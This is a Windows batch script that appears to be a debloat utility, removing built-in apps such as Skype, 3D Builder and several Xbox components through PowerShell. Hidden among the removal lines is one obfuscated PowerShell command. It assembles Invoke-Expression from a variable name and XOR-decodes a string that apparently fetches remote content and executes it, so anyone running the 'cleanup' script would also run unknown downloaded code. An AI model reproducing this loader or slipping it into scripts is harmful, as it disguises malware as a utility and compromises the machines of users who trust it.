@echo off

:delete
PowerShell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsSoundRecorder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *windowscommunicationsapps* | Remove-AppxPackage"
powershell ".((GET-vARIABle '*Mdr*').nAme[3,11,2]-jOin'') ( ('117w110!113!60d52~62K103~42d97!103A40q97R103y41w97d103!45q97A103!44A97q103~46q97g103d47w97y62R60q49!122~59y114g51R59R48q59R127~59g48R59!110A59q48!59!125d107R59K48w59q101w50g127q115!51q115~59q48!59K119~106g108g36d125y59g48g59!110~121q114A104y110K59!53!60A96K60w117d121d100' -SPliT'W' -SPLIT'K'-SPlit'd'-SPLit'Y' -SpliT 'q'-spliT 'r' -SpLIT'a'-sPLIT '~'-SplIt'g'-sPliT '!'| fOreaCh{[cHar]($_ -BXOr"0x1c") })-joiN '' )"
PowerShell -Command "Get-AppxPackage *Microsoft.Xbox.TCUI* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxGameCallableUI* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxGameOverlay* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxGamingOverlay* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxIdentityProvider* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxLive* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.XboxSpeechToTextOverlay* | Remove-AppxPackage"
pause